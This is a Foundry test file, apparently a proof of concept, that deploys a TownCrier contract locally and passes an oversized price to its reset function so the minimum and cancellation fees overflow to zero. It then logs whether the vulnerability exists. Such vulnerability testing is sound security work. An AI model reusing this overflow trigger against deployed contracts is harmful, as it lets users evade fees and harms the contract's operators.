// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x89c1b3807d4c67df034fffb62f3509561218d30b.sol";

contract TownCrierOverflowTest is Test {
    TownCrier public tc;
    address public testContract;

    function setUp() public {
        tc = new TownCrier();
        testContract = address(this);
    }

    function test_resetOverflow() public {
        // --- BEFORE-Trigger Normal Fees Setup ---
        // Set normal fees to establish baseline state
        vm.prank(testContract);
        tc.reset(1, 1, 1);
        
        uint minFeeBefore = tc.MIN_FEE();
        uint cancellationFeeBefore = tc.CANCELLATION_FEE();
        console2.log("--- BEFORE-Trigger State ---");
        console2.log("MIN_FEE (before):", minFeeBefore);
        console2.log("CANCELLATION_FEE (before):", cancellationFeeBefore);
        
        // --- Trigger Overflow Operation ---
        console2.log("--- TRIGGER OverflowCall ---");
        uint256 overflowPrice = type(uint256).max / 2 + 1; // 2^255
        uint256 minGas = 4;
        uint256 cancellationGas = 4;

        // Expect event indicating overflow result
        vm.expectEmit(true, true, true, true, address(tc));
        emit TownCrier.Reset(overflowPrice, 0, 0);

        // Execute overflow transaction
        vm.prank(testContract);
        tc.reset(overflowPrice, minGas, cancellationGas);

        // --- AFTER-Trigger State Check ---
        console2.log("--- AFTER-Trigger State ---");
        uint minFeeAfter = tc.MIN_FEE();
        uint cancellationFeeAfter = tc.CANCELLATION_FEE();
        console2.log("MIN_FEE (after):", minFeeAfter);
        console2.log("CANCELLATION_FEE (after):", cancellationFeeAfter);
        
        // --- Vulnerability Verification ---
        if (minFeeAfter == 0 && cancellationFeeAfter == 0) {
            console2.log("Vulnerability Exists: MIN_FEE and CANCELLATION_FEE overflowed to zero");
        } else {
            console2.log("Vulnerability not Exist: Fees unchanged after overflow attempt");
        }
    }
}